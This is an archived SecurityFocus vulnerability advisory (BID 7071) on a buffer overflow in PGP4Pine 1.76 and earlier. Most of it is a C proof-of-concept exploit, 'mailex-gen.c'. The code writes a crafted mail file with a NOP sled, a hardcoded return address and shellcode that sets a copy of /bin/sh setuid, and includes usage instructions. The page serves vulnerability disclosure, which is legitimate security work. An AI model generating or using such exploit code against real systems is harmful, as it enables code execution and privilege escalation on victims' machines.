source: http://www.securityfocus.com/bid/7071/info

A vulnerability has been discovered in PGP4Pine. The problem occurs when parsing an email message for PGP data. Due to insufficient bounds checking, when processing lines of excessive length, a buffer may be overrun. This would result in sensitive locations in memory being overwritten with data supplied in the message.

Successful exploitation of this issue may allow a remote attacker to execute arbitrary commands on a target system. All instructions executed would be run with the privileges of the users running the software.

This issue affects pgp4pine version 1.76 and earlier.


/* 
 *  mailex-gen.c -- PGP4Pine exploit mail generator - proof of concept 
 *  Copyright (C) 2003 - Eric AUGE
 *  
 *   This program is free software; you can redistribute it and/or
 *   modify it under the terms of the GNU General Public License
 *   as published by the Free Software Foundation; either version 2 of
 *   the License or (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be
 *   useful, but WITHOUT ANY WARRANTY; without even the implied
 *   warranty
 *   of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public
 *   License
 *   along with this program; if not, write to the Free Software
 *   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA
 *   02111-1307
 *   USA
 *
 * how poc code works : 
 *   $ cp /bin/sh /tmp/sh
 *   $ ls -l /tmp/sh
 *   -rwxr-x---    1 rival    users      680304 Mar 12 15:17 /tmp/sh
 *   $ ./mailex-gen
 *   eip (i use readline[] addr): 0xbfffdbd0
 *   now type: /path/to/pgp4pine-vuln -d -i ./mailme
 *   $ /path/to/pgp4pine-vuln -d -i ./mailme
 *   $ ls -l /tmp/sh
 *   -rwsr-xr-x    1 rival    users      680304 Mar 12 15:17 /tmp/sh
 *
 *
 *   Eric AUGE <eauge@fr.cw.net>
 *
 */

/* 
 * NOTE: EIP is hardcoded regarding my own system and tests,
 *       tune it for your needs ;)
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define MAXLINESIZE 301
#define SAVED_EIP 0xbfffdbd0
#define NOP 0x90
#define ALIGN 0
#define XFILE "mailme"

/* quick made chown 4755 /tmp/sh */
unsigned char shellcode[] = 
"\xeb\x14\x31\xc0\x34\x0f\x5b\x31\xc9\x66\xb9\xed\x09\xcd\x80"
"\x31\xc0\x40\x89\xc3\xcd\x80\xe8\xe7\xff\xff\xff/tmp/sh";

int main(int argc, char **argv) {

    int i,_sc_size,fd;
    unsigned char buffer[MAXLINESIZE] = "\0";
    long *ptr;
    char *cptr;

    _sc_size = sizeof(shellcode);

    ptr = (long *) &buffer;
    fprintf(stderr,"eip (i use readline[] addr): %p\n", SAVED_EIP);
    for (i = 0; i < MAXLINESIZE ; i += 4) {
	*ptr++ = SAVED_EIP;
    }

    cptr = (char *) &buffer;
    cptr = cptr + MAXLINESIZE - 45 - _sc_size;

    for ( i = 0; i < _sc_size ; i++ )
	*cptr++ = shellcode[i];

    for ( cptr = (char *) &buffer ; cptr < ((char *)buffer + MAXLINESIZE - 45 - _sc_size) ; cptr++)
	*cptr = NOP;

    /* now lets create the file */
    if ( (fd = open(XFILE, O_CREAT|O_WRONLY|O_TRUNC, S_IRWXU|S_IRGRP|S_IROTH)) == -1) {
	fprintf (stderr,"open() failed!\n");
	exit(1);
    }
    write(fd,&buffer,sizeof(buffer));
    close(fd);
    fprintf(stderr,"now type: /path/to/pgp4pine-vuln -d -i ./mailme\n");
	
    return (0);
}